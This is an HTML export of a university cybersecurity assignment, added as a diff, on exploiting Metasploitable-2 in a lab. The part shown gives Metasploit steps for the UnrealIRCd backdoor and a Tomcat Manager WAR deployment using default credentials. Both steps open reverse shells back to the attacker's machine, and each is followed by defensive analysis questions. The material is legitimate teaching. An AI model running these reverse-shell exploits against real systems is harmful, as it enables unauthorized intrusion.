@@ -1,0 +1,1225 @@
+<!DOCTYPE html><html><head>
+      <title>a2_description</title>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      
+      <link rel="stylesheet" href="file:///c:\Users\jafariha\.vscode\extensions\shd101wyy.markdown-preview-enhanced-0.8.22\crossnote\dependencies\katex\katex.min.css">
+      
+      
+      
+      
+      
+      <style>
+      code[class*=language-],pre[class*=language-]{color:#333;background:0 0;font-family:Consolas,"Liberation Mono",Menlo,Courier,monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.4;-moz-tab-size:8;-o-tab-size:8;tab-size:8;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:.8em;overflow:auto;border-radius:3px;background:#f5f5f5}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal;background:#f5f5f5}.token.blockquote,.token.comment{color:#969896}.token.cdata{color:#183691}.token.doctype,.token.macro.property,.token.punctuation,.token.variable{color:#333}.token.builtin,.token.important,.token.keyword,.token.operator,.token.rule{color:#a71d5d}.token.attr-value,.token.regex,.token.string,.token.url{color:#183691}.token.atrule,.token.boolean,.token.code,.token.command,.token.constant,.token.entity,.token.number,.token.property,.token.symbol{color:#0086b3}.token.prolog,.token.selector,.token.tag{color:#63a35c}.token.attr-name,.token.class,.token.class-name,.token.function,.token.id,.token.namespace,.token.pseudo-class,.token.pseudo-element,.token.url-reference .token.variable{color:#795da3}.token.entity{cursor:help}.token.title,.token.title .token.punctuation{font-weight:700;color:#1d3e81}.token.list{color:#ed6a43}.token.inserted{background-color:#eaffea;color:#55a532}.token.deleted{background-color:#ffecec;color:#bd2c00}.token.bold{font-weight:700}.token.italic{font-style:italic}.language-json .token.property{color:#183691}.language-markup .token.tag .token.punctuation{color:#333}.language-css .token.function,code.language-css{color:#0086b3}.language-yaml .token.atrule{color:#63a35c}code.language-yaml{color:#183691}.language-ruby .token.function{color:#333}.language-markdown .token.url{color:#795da3}.language-makefile .token.symbol{color:#795da3}.language-makefile .token.variable{color:#183691}.language-makefile .token.builtin{color:#0086b3}.language-bash .token.keyword{color:#0086b3}pre[data-line]{position:relative;padding:1em 0 1em 3em}pre[data-line] .line-highlight-wrapper{position:absolute;top:0;left:0;background-color:transparent;display:block;width:100%}pre[data-line] .line-highlight{position:absolute;left:0;right:0;padding:inherit 0;margin-top:1em;background:hsla(24,20%,50%,.08);background:linear-gradient(to right,hsla(24,20%,50%,.1) 70%,hsla(24,20%,50%,0));pointer-events:none;line-height:inherit;white-space:pre}pre[data-line] .line-highlight:before,pre[data-line] .line-highlight[data-end]:after{content:attr(data-start);position:absolute;top:.4em;left:.6em;min-width:1em;padding:0 .5em;background-color:hsla(24,20%,50%,.4);color:#f4f1ef;font:bold 65%/1.5 sans-serif;text-align:center;vertical-align:.3em;border-radius:999px;text-shadow:none;box-shadow:0 1px #fff}pre[data-line] .line-highlight[data-end]:after{content:attr(data-end);top:auto;bottom:.4em}html body{font-family:'Helvetica Neue',Helvetica,'Segoe UI',Arial,freesans,sans-serif;font-size:16px;line-height:1.6;color:#333;background-color:#fff;overflow:initial;box-sizing:border-box;word-wrap:break-word}html body>:first-child{margin-top:0}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{line-height:1.2;margin-top:1em;margin-bottom:16px;color:#000}html body h1{font-size:2.25em;font-weight:300;padding-bottom:.3em}html body h2{font-size:1.75em;font-weight:400;padding-bottom:.3em}html body h3{font-size:1.5em;font-weight:500}html body h4{font-size:1.25em;font-weight:600}html body h5{font-size:1.1em;font-weight:600}html body h6{font-size:1em;font-weight:600}html body h1,html body h2,html body h3,html body h4,html body h5{font-weight:600}html body h5{font-size:1em}html body h6{color:#5c5c5c}html body strong{color:#000}html body del{color:#5c5c5c}html body a:not([href]){color:inherit;text-decoration:none}html body a{color:#08c;text-decoration:none}html body a:hover{color:#00a3f5;text-decoration:none}html body img{max-width:100%}html body>p{margin-top:0;margin-bottom:16px;word-wrap:break-word}html body>ol,html body>ul{margin-bottom:16px}html body ol,html body ul{padding-left:2em}html body ol.no-list,html body ul.no-list{padding:0;list-style-type:none}html body ol ol,html body ol ul,html body ul ol,html body ul ul{margin-top:0;margin-bottom:0}html body li{margin-bottom:0}html body li.task-list-item{list-style:none}html body li>p{margin-top:0;margin-bottom:0}html body .task-list-item-checkbox{margin:0 .2em .25em -1.8em;vertical-align:middle}html body .task-list-item-checkbox:hover{cursor:pointer}html body blockquote{margin:16px 0;font-size:inherit;padding:0 15px;color:#5c5c5c;background-color:#f0f0f0;border-left:4px solid #d6d6d6}html body blockquote>:first-child{margin-top:0}html body blockquote>:last-child{margin-bottom:0}html body hr{height:4px;margin:32px 0;background-color:#d6d6d6;border:0 none}html body table{margin:10px 0 15px 0;border-collapse:collapse;border-spacing:0;display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}html body table th{font-weight:700;color:#000}html body table td,html body table th{border:1px solid #d6d6d6;padding:6px 13px}html body dl{padding:0}html body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:700}html body dl dd{padding:0 16px;margin-bottom:16px}html body code{font-family:Menlo,Monaco,Consolas,'Courier New',monospace;font-size:.85em;color:#000;background-color:#f0f0f0;border-radius:3px;padding:.2em 0}html body code::after,html body code::before{letter-spacing:-.2em;content:'\00a0'}html body pre>code{padding:0;margin:0;word-break:normal;white-space:pre;background:0 0;border:0}html body .highlight{margin-bottom:16px}html body .highlight pre,html body pre{padding:1em;overflow:auto;line-height:1.45;border:#d6d6d6;border-radius:3px}html body .highlight pre{margin-bottom:0;word-break:normal}html body pre code,html body pre tt{display:inline;max-width:initial;padding:0;margin:0;overflow:initial;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}html body pre code:after,html body pre code:before,html body pre tt:after,html body pre tt:before{content:normal}html body blockquote,html body dl,html body ol,html body p,html body pre,html body ul{margin-top:0;margin-bottom:16px}html body kbd{color:#000;border:1px solid #d6d6d6;border-bottom:2px solid #c7c7c7;padding:2px 4px;background-color:#f0f0f0;border-radius:3px}@media print{html body{background-color:#fff}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{color:#000;page-break-after:avoid}html body blockquote{color:#5c5c5c}html body pre{page-break-inside:avoid}html body table{display:table}html body img{display:block;max-width:100%;max-height:100%}html body code,html body pre{word-wrap:break-word;white-space:pre}}.markdown-preview{width:100%;height:100%;box-sizing:border-box}.markdown-preview ul{list-style:disc}.markdown-preview ul ul{list-style:circle}.markdown-preview ul ul ul{list-style:square}.markdown-preview ol{list-style:decimal}.markdown-preview ol ol,.markdown-preview ul ol{list-style-type:lower-roman}.markdown-preview ol ol ol,.markdown-preview ol ul ol,.markdown-preview ul ol ol,.markdown-preview ul ul ol{list-style-type:lower-alpha}.markdown-preview .newpage,.markdown-preview .pagebreak{page-break-before:always}.markdown-preview pre.line-numbers{position:relative;padding-left:3.8em;counter-reset:linenumber}.markdown-preview pre.line-numbers>code{position:relative}.markdown-preview pre.line-numbers .line-numbers-rows{position:absolute;pointer-events:none;top:1em;font-size:100%;left:0;width:3em;letter-spacing:-1px;border-right:1px solid #999;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-preview pre.line-numbers .line-numbers-rows>span{pointer-events:none;display:block;counter-increment:linenumber}.markdown-preview pre.line-numbers .line-numbers-rows>span:before{content:counter(linenumber);color:#999;display:block;padding-right:.8em;text-align:right}.markdown-preview .mathjax-exps .MathJax_Display{text-align:center!important}.markdown-preview:not([data-for=preview]) .code-chunk .code-chunk-btn-group{display:none}.markdown-preview:not([data-for=preview]) .code-chunk .status{display:none}.markdown-preview:not([data-for=preview]) .code-chunk .output-div{margin-bottom:16px}.markdown-preview .md-toc{padding:0}.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link{display:inline;padding:.25rem 0}.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link div,.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link p{display:inline}.markdown-preview .md-toc .md-toc-link-wrapper.highlighted .md-toc-link{font-weight:800}.scrollbar-style::-webkit-scrollbar{width:8px}.scrollbar-style::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}.scrollbar-style::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,.66);border:4px solid rgba(150,150,150,.66);background-clip:content-box}html body[for=html-export]:not([data-presentation-mode]){position:relative;width:100%;height:100%;top:0;left:0;margin:0;padding:0;overflow:auto}html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{position:relative;top:0;min-height:100vh}@media screen and (min-width:914px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{padding:2em calc(50% - 457px + 2em)}}@media screen and (max-width:914px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{font-size:14px!important;padding:1em}}@media print{html body[for=html-export]:not([data-presentation-mode]) #sidebar-toc-btn{display:none}}html body[for=html-export]:not([data-presentation-mode]) #sidebar-toc-btn{position:fixed;bottom:8px;left:8px;font-size:28px;cursor:pointer;color:inherit;z-index:99;width:32px;text-align:center;opacity:.4}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] #sidebar-toc-btn{opacity:1}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc{position:fixed;top:0;left:0;width:300px;height:100%;padding:32px 0 48px 0;font-size:14px;box-shadow:0 0 4px rgba(150,150,150,.33);box-sizing:border-box;overflow:auto;background-color:inherit}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar{width:8px}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,.66);border:4px solid rgba(150,150,150,.66);background-clip:content-box}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc a{text-decoration:none}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc{padding:0 16px}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link{display:inline;padding:.25rem 0}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link div,html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link p{display:inline}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper.highlighted .md-toc-link{font-weight:800}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{left:300px;width:calc(100% - 300px);padding:2em calc(50% - 457px - 300px / 2);margin:0;box-sizing:border-box}@media screen and (max-width:1274px){html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{width:100%}}html body[for=html-export]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .markdown-preview{left:50%;transform:translateX(-50%)}html body[for=html-export]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .md-sidebar-toc{display:none}
+/* Please visit the URL below for more information: */
+/*   https://shd101wyy.github.io/markdown-preview-enhanced/#/customize-css */
+
+      </style>
+      <script type="text/javascript">
+  document.addEventListener("DOMContentLoaded", function () {
+    // your code here
+  });
+</script>
+    </head>
+    <body for="html-export">
+      <div class="crossnote markdown-preview  ">
+      
+<h1 id="assignment-2-exploitations-and-vulnerability-analysis"><strong>Assignment 2: Exploitations and Vulnerability Analysis</strong> </h1>
+<h5 id="csci-5742-cybersecurity-programming-and-analytics-spring-2026">CSCI 5742: Cybersecurity Programming and Analytics, Spring 2026 </h5>
+<h5 id="total-points-200">Total Points: 200 </h5>
+<hr>
+<h2 id="objectives"><strong>Objectives</strong> </h2>
+<p>This assignment provides practical experience in discovering, analyzing, and exploiting software vulnerabilities using a controlled three-VM cybersecurity testbed. By completing this assignment, students will:</p>
+<ol>
+<li><strong>Execute real-world remote exploits</strong> using Metasploit against known CVEs (e.g., UnrealIRCd, Apache Tomcat).</li>
+<li><strong>Analyze memory corruption vulnerabilities</strong> (buffer overflow, integer overflow, format string bugs) in C programs using manual input and automated sanitizers (ASan, UBSan, Valgrind).</li>
+<li><strong>Identify and exploit common web application flaws</strong> in Mutillidae, including SQL Injection, Command Injection, and Cross-Site Scripting (XSS), while understanding the impact and mitigation strategies.</li>
+<li><strong>Apply static and dynamic code analysis</strong> tools (Cppcheck, Flawfinder, ASan, UBSan, Valgrind) to detect insecure coding patterns and runtime memory issues.</li>
+<li><strong>Perform vulnerability scanning using Nmap</strong>, map findings to CVEs, CWEs, and MITRE ATT&amp;CK techniques, and recommend appropriate security controls.</li>
+<li><strong>Strengthen secure coding and threat modeling skills</strong> by refactoring vulnerable code and proposing compiler-level and application-layer defenses.</li>
+<li><strong>Interpret tool outputs and correlate vulnerabilities to attacker behavior</strong>, demonstrating awareness of real-world exploitation chains and secure software lifecycle practices.</li>
+</ol>
+<hr>
+<h2 id="submission-requirements"><strong>Submission Requirements</strong> </h2>
+<h3 id="a-report"><strong>A. Report</strong> </h3>
+<ul>
+<li>Submit a <strong>complete report</strong> named <code>a2_report.md</code>.</li>
+<li>Your report must include <strong>answers to all questions</strong> from <strong>Parts 1–4</strong>, as outlined in the <strong>Deliverables</strong> sections of each task/part.</li>
+<li>Organize your report clearly by <strong>part and task</strong>, and reference any attached screenshots, outputs, or code as needed.</li>
+</ul>
+<h3 id="b-code"><strong>B. Code</strong> </h3>
+<ul>
+<li>Submit <strong>all required code files</strong>, including but not limited to:
+<ul>
+<li><code>vulnerable_code.c</code>, <code>protected_code.c</code></li>
+<li>Scripts or helper files used for scanning, exploitation, or analysis</li>
+</ul>
+</li>
+<li>Ensure code is <strong>well-commented and functional</strong>.</li>
+</ul>
+<h3 id="c-optional-demo"><strong>C. Optional Demo</strong> </h3>
+<ul>
+<li>You may include a short (3–5 min) <strong>demo video</strong> showing key components of your work (e.g., successful exploitation, detection, analysis workflows).</li>
+</ul>
+<h3 id="d-packaging"><strong>D. Packaging</strong> </h3>
+<ul>
+<li>Compress your entire submission into a single <strong>ZIP archive</strong>.</li>
+</ul>
+<hr>
+<h2 id="-grading-rubric-total-200-points">🔒 Grading Rubric (Total: 200 Points) </h2>
+<table>
+<thead>
+<tr>
+<th><strong>Section</strong></th>
+<th><strong>Task</strong></th>
+<th><strong>Points</strong></th>
+<th><strong>Grading Criteria</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Part 1: Advanced Exploitation with Metasploit (50 pts)</strong></td>
+<td>Task 1: UnrealIRCd Exploit</td>
+<td>25</td>
+<td>Exploit success, labeled screenshots, complete and thoughtful answers to all 9 analysis questions</td>
+</tr>
+<tr>
+<td></td>
+<td>Task 2: Tomcat Manager Exploit</td>
+<td>25</td>
+<td>Successful WAR deployment via Metasploit, access confirmation, complete and relevant answers to all 8 questions</td>
+</tr>
+<tr>
+<td><strong>Part 2: Memory Corruption in Native C Applications (50 pts)</strong></td>
+<td>Task 1: Stack Protections Comparison</td>
+<td>10</td>
+<td>Correct compilation steps, overflow demonstration, proper use of <code>dmesg</code>, and analytical depth in responses</td>
+</tr>
+<tr>
+<td></td>
+<td>Task 2: Static Analysis (Cppcheck &amp; Flawfinder)</td>
+<td>10</td>
+<td>Tool outputs, filled comparison table, accuracy in CWE tags and tool differences, clear justifications</td>
+</tr>
+<tr>
+<td></td>
+<td>Task 3: Dynamic Analysis (ASan, UBSan, Valgrind)</td>
+<td>20</td>
+<td>Screenshots, filled table, and detailed tool behavior analysis across all vulnerabilities</td>
+</tr>
+<tr>
+<td></td>
+<td>Task 4: Secure Refactoring</td>
+<td>10</td>
+<td>Root cause explanations, secure alternatives with trade-offs, complete and working <code>protected_code.c</code>, compiler mitigation analysis</td>
+</tr>
+<tr>
+<td><strong>Part 3: Web Exploitation with Mutillidae (50 pts)</strong></td>
+<td>Task 1: SQL Injection</td>
+<td>10</td>
+<td>Bypass demo screenshot, input field analysis, type of injection identified, mitigation rationale</td>
+</tr>
+<tr>
+<td></td>
+<td>Task 2: Command Injection</td>
+<td>20</td>
+<td>Multiple successful injections, system data extraction, defense discussion, type identification (reflected/blind)</td>
+</tr>
+<tr>
+<td></td>
+<td>Task 3: Cross-Site Scripting</td>
+<td>20</td>
+<td>Both Reflected and Stored XSS exploited, working payloads, captured cookies or alerts, correct mitigation analysis</td>
+</tr>
+<tr>
+<td><strong>Part 4: Vulnerability Scanning and Analysis (50 pts)</strong></td>
+<td>Task 1: Nmap Scans</td>
+<td>10</td>
+<td>Full port scan and vuln scan outputs, screenshots, service version identification</td>
+</tr>
+<tr>
+<td></td>
+<td>Task 2: Technical Analysis of 5 Vulns</td>
+<td>10</td>
+<td>Accurate CVEs, port and service match, brief exploit summary, CVSS details</td>
+</tr>
+<tr>
+<td></td>
+<td>Task 3: CWE Classification</td>
+<td>10</td>
+<td>Five correct CWE mappings with impact analysis</td>
+</tr>
+<tr>
+<td></td>
+<td>Task 4: ATT&amp;CK Mapping</td>
+<td>10</td>
+<td>Two or more mappings with tactic, technique, and real-world alignment</td>
+</tr>
+<tr>
+<td></td>
+<td>Task 5: Mitigation Strategies</td>
+<td>10</td>
+<td>For each vuln: one technical + one admin control, mitigation category, practical justifications</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="testbed-setup"><strong>Testbed Setup</strong> </h2>
+<ol>
+<li><strong>Kali Attacker VM</strong>: Conduct all attacks and exploitations.</li>
+<li><strong>Metasploitable-2 VM</strong>: Target vulnerable machine with pre-configured services and applications.</li>
+</ol>
+<p>We do not need <strong>Kali Defender VM</strong> for this assignment.</p>
+<p>Verify network connectivity between VMs before proceeding.</p>
+<div style="text-align: center; margin: 15px 1;">
+    <hr style="border: 5px; height: 20px; width: 100%;">
+</div>
+<h2 id="part-1-advanced-exploitation-with-metasploit-50-points"><strong>Part 1: Advanced Exploitation with Metasploit (50 Points)</strong> </h2>
+<p>This section provides detailed guidance and clear, step-by-step instructions for exploiting two specific vulnerabilities on the Metasploitable-2 target machine using Metasploit.</p>
+<h3 id="-task-1-exploiting-unrealircd-backdoor-25-points">🔸 <strong>Task 1: Exploiting UnrealIRCd Backdoor (25 Points)</strong> </h3>
+<h3 id="overview-of-vulnerability"><strong>Overview of Vulnerability:</strong> </h3>
+<ul>
+<li><strong>Type:</strong> Backdoor (unauthorized access)</li>
+<li><strong>Vulnerable Software:</strong> UnrealIRCd 3.2.8.1</li>
+<li><strong>CVE Reference:</strong> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2075">CVE-2010-2075</a></li>
+<li><strong>Description:</strong> This vulnerability is due to an embedded backdoor introduced maliciously in UnrealIRCd 3.2.8.1, allowing attackers remote command execution on the server hosting the IRC daemon.</li>
+</ul>
+<hr>
+<h4 id="step-1-reconnaissance"><strong>Step 1: Reconnaissance:</strong> </h4>
+<ul>
+<li>Identify the UnrealIRCd service using <code>nmap</code>:<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-p</span> <span class="token number">6667</span> <span class="token punctuation">[</span>Metasploitable-2_IP<span class="token punctuation">]</span>
+</code></pre></li>
+<li>Confirm that UnrealIRCd 3.2.8.1 is running and vulnerable.</li>
+</ul>
+<h4 id="step-2-launch-metasploit-framework"><strong>Step 2: Launch Metasploit Framework:</strong> </h4>
+<ul>
+<li>Start Metasploit:<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>msfconsole
+</code></pre></li>
+</ul>
+<h4 id="step-3-locate-exploit-module"><strong>Step 3: Locate Exploit Module:</strong> </h4>
+<ul>
+<li>Search Metasploit modules for UnrealIRCd:<pre data-role="codeBlock" data-info="msf" class="language-msf msf"><code>search unreal_ircd
+</code></pre></li>
+<li>Load exploit:<pre data-role="codeBlock" data-info="msf" class="language-msf msf"><code>use exploit/unix/irc/unreal_ircd_3281_backdoor
+</code></pre></li>
+</ul>
+<h4 id="step-4-configure-exploit"><strong>Step 4: Configure Exploit:</strong> </h4>
+<ul>
+<li>Set required parameters:<pre data-role="codeBlock" data-info="msf" class="language-msf msf"><code>set RHOST [Metasploitable-2_IP]
+set RPORT 6667
+</code></pre></li>
+<li>Select payload (reverse shell):<pre data-role="codeBlock" data-info="msf" class="language-msf msf"><code>set payload cmd/unix/reverse
+set LHOST [Your_Kali_IP]
+set LPORT 4444
+</code></pre></li>
+</ul>
+<h4 id="step-5-run-the-exploit"><strong>Step 5: Run the Exploit:</strong> </h4>
+<ul>
+<li>Execute the exploit:<pre data-role="codeBlock" data-info="msf" class="language-msf msf"><code>exploit
+</code></pre></li>
+</ul>
+<h4 id="step-6-verify-exploitation"><strong>Step 6: Verify Exploitation:</strong> </h4>
+<ul>
+<li>A successful exploit will return a reverse shell. Verify with:<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">whoami</span>
+<span class="token function">id</span>
+<span class="token function">uname</span> <span class="token parameter variable">-a</span>
+</code></pre></li>
+</ul>
+<hr>
+<h4 id="analyze-unrealircd-backdoor-exploit-and-answer-these-questions">Analyze UnrealIRCd backdoor exploit and answer these questions: </h4>
+<ol>
+<li><strong>How does this backdoor differ from typical software vulnerabilities like buffer overflows or input sanitization flaws?</strong></li>
+</ol>
+<ul>
+<li><em>Hint:</em> Consider the difference between unintentional bugs and deliberate malicious code insertion.</li>
+</ul>
+<ol start="2">
+<li><strong>Why is the existence of a compiled backdoor in an open-source project so concerning?</strong></li>
+</ol>
+<ul>
+<li><em>Hint:</em> Reflect on software supply chain trust, distribution methods, and the challenge of verifying third-party code.</li>
+</ul>
+<ol start="3">
+<li><strong>What security mechanisms (if any) could have prevented the execution of this backdoor?</strong></li>
+</ol>
+<ul>
+<li><em>Hint:</em> Think about integrity checking (e.g., hashes, digital signatures), sandboxing, and system-level monitoring.</li>
+</ul>
+<ol start="4">
+<li><strong>How does the delivery of this exploit violate traditional trust assumptions in network services?</strong></li>
+</ol>
+<ul>
+<li><em>Hint:</em> IRC servers are typically used for communication. What does it imply when a server trusts all input by default?</li>
+</ul>
+<ol start="5">
+<li><strong>Suppose the target server had egress filtering or restricted outbound traffic, how would that impact this attack?</strong></li>
+</ol>
+<ul>
+<li><em>Hint:</em> The payload sends a reverse shell back to the attacker. What does that require from the network?</li>
+</ul>
+<ol start="6">
+<li><strong>What MITRE ATT&amp;CK tactics and techniques does this exploit align with?</strong></li>
+</ol>
+<ul>
+<li><em>Hint:</em> Consider <code>Initial Access</code> and <code>Command and Control</code>. What techniques describe unauthorized remote shell access?</li>
+</ul>
+<ol start="7">
+<li><strong>How can an organization detect that this specific backdoor has been exploited?</strong></li>
+</ol>
+<ul>
+<li><em>Hint:</em> Would you rely on file integrity monitoring, network traffic inspection, log analysis, or something else?</li>
+</ul>
+<ol start="8">
+<li><strong>How could proper system administration practices reduce the risk of this vulnerability being present?</strong></li>
+</ol>
+<ul>
+<li><em>Hint:</em> Think about software provenance, patching, and avoiding running outdated and unverified services.</li>
+</ul>
+<ol start="9">
+<li><strong>How does this attack demonstrate the importance of <strong>supply chain security</strong> in open-source software?</strong></li>
+</ol>
+<hr>
+<h4 id="-deliverables-for-task-1"><strong>🔹 Deliverables for Task 1:</strong> </h4>
+<ul>
+<li>Screenshots clearly showing:
+<ul>
+<li>Nmap scan identifying UnrealIRCd</li>
+<li>Metasploit configured with correct parameters</li>
+<li>Successful commands execution (reverse shell session) with executed commands.</li>
+</ul>
+</li>
+<li>Answers to analaysis questions.</li>
+</ul>
+<hr>
+<h3 id="-task-2-exploiting-tomcat-manager-authentication-bypass-25-points">🔸 <strong>Task 2: Exploiting Tomcat Manager Authentication Bypass (25 Points)</strong> </h3>
+<h4 id="overview-of-vulnerability-1"><strong>Overview of Vulnerability</strong> </h4>
+<ul>
+<li><strong>Vulnerability Type</strong>: Weak/default credentials</li>
+<li><strong>Vulnerable Software</strong>: Apache Tomcat Manager</li>
+<li><strong>Port</strong>: 8180</li>
+<li><strong>CVE Reference</strong>: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3843">CVE-2009-3843</a></li>
+<li><strong>Impact</strong>: Remote code execution via WAR file deployment when logging in with default credentials (<code>tomcat:tomcat</code>)</li>
+</ul>
+<hr>
+<h4 id="step-1-discover-tomcat-manager"><strong>Step 1: Discover Tomcat Manager</strong> </h4>
+<p>Run a service version scan targeting port 8180:</p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-p</span> <span class="token number">8180</span> <span class="token punctuation">[</span>Metasploitable2-IP<span class="token punctuation">]</span>
+</code></pre><p>Expected output:</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>8180/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+</code></pre><hr>
+<h4 id="step-2-verify-in-browser"><strong>Step 2: Verify in Browser</strong> </h4>
+<p>Open the Tomcat Manager interface in your browser:</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>http://[Metasploitable2-IP]:8180/manager/html
+</code></pre><blockquote>
+<p>🔐 You should be prompted for login credentials. Try:</p>
+</blockquote>
+<ul>
+<li>Username: <code>tomcat</code></li>
+<li>Password: <code>tomcat</code></li>
+</ul>
+<hr>
+<h4 id="step-3-exploit-via-metasploit"><strong>Step 3: Exploit via Metasploit</strong> </h4>
+<p>Launch Metasploit and use the Tomcat Manager deployment module:</p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>msfconsole
+</code></pre><pre data-role="codeBlock" data-info="msf" class="language-msf msf"><code>search tomcat_mgr
+use exploit/multi/http/tomcat_mgr_deploy
+</code></pre><p>Set the required options:</p>
+<pre data-role="codeBlock" data-info="msf" class="language-msf msf"><code>set RHOSTS [Metasploitable2-IP]
+set RPORT 8180
+set HttpUsername tomcat
+set HttpPassword tomcat
+set PAYLOAD java/meterpreter/reverse_tcp
+set LHOST [Your-Kali-IP]
+set LPORT 4444
+run
+</code></pre><hr>
+<h4 id="step-4-post-exploitation"><strong>Step 4: Post-Exploitation</strong> </h4>
+<p>After successful exploitation, interact with the Meterpreter session:</p>
+<pre data-role="codeBlock" data-info="msf" class="language-msf msf"><code>sessions
+sessions -i [ID]
+</code></pre><p>Within Meterpreter:</p>
+<pre data-role="codeBlock" data-info="meterpreter" class="language-meterpreter meterpreter"><code>sysinfo
+getuid
+</code></pre><hr>
+<h4 id="-analyze-and-respond">🔍 <strong>Analyze and Respond</strong> </h4>
+<ol>
+<li><strong>Why do default credentials pose such a serious security risk in production systems?</strong></li>
+</ol>
+<ul>
+<li><em>Hint:</em> Consider the principle of "least privilege" and the human tendency to ignore or overlook default settings.</li>
+</ul>
+<ol start="2">
+<li><strong>Why is the Tomcat Manager interface so dangerous when misconfigured or left exposed to the internet?</strong></li>
+</ol>
+<ul>
+<li><em>Hint:</em> Think about what functionality this interface provides and what kinds of files it can execute.</li>
+</ul>
+<ol start="3">
+<li><strong>Why does the exploit use a <code>.war</code> (Web Application Archive) file for deploying the payload?</strong></li>
+</ol>
+<ul>
+<li><em>Hint:</em> Review the deployment model of Java-based web applications and how WARs are used in Tomcat.</li>
+</ul>
+<ol start="4">
+<li><strong>How does this vulnerability map to real-world attacker behavior in the MITRE ATT&amp;CK framework?</strong></li>
+</ol>
+<ul>
+<li><em>Hint:</em> Consider Initial Access (<code>T1190</code> – Exploit Public-Facing Application) and Execution (<code>T1059</code> – Command and Scripting Interpreter).</li>
+</ul>
+<ol start="5">
+<li><strong>If this attack succeeds, what could an attacker do next to maintain access or pivot deeper into a network?</strong></li>
+</ol>
+<ul>
+<li><em>Hint:</em> Think about persistence techniques, lateral movement, and privilege escalation.</li>
+</ul>
+<ol start="6">
+<li><strong>Why might traditional network defenses (like firewalls or antivirus) fail to prevent this exploit?</strong></li>
+</ol>
+<ul>
+<li><em>Hint:</em> Consider how the payload is delivered (HTTP), how it blends in with normal admin behavior, and the nature of remote shellcode execution.</li>
+</ul>
+<ol start="7">
+<li><strong>What mitigation strategies could be implemented beyond just "changing the password"?</strong></li>
+</ol>
+<ul>
+<li><em>Hint:</em> Explore network segmentation, interface access restrictions, use of multi-factor authentication (MFA), or disabling the Manager interface entirely in production.</li>
+</ul>
+<ol start="8">
+<li><strong>What are the risks of running outdated server software like Tomcat 5.x or 6.x in an enterprise environment today?</strong></li>
+</ol>
+<ul>
+<li><em>Hint:</em> Consider availability of patches, community support, vulnerability exposure, and compliance frameworks (e.g., PCI-DSS, HIPAA).</li>
+</ul>
+<hr>
+<h4 id="-deliverables-for-task-2"><strong>🔹 Deliverables for Task 2:</strong> </h4>
+<ul>
+<li>Screenshots showing clearly:
+<ul>
+<li>Nmap scan confirming Tomcat Manager</li>
+<li>Successful authentication using default credentials</li>
+<li>Meterpreter or shell access to target system, with commands executed.</li>
+</ul>
+</li>
+<li>Answers to analysis questions.</li>
+</ul>
+<div style="text-align: center; margin: 15px 1;">
+    <hr style="border: 5px; height: 20px; width: 100%;">
+</div>
+<h2 id="part-2-memory-corruption-in-native-c-applications-50-points"><strong>Part 2: Memory Corruption in Native C Applications (50 Points)</strong> </h2>
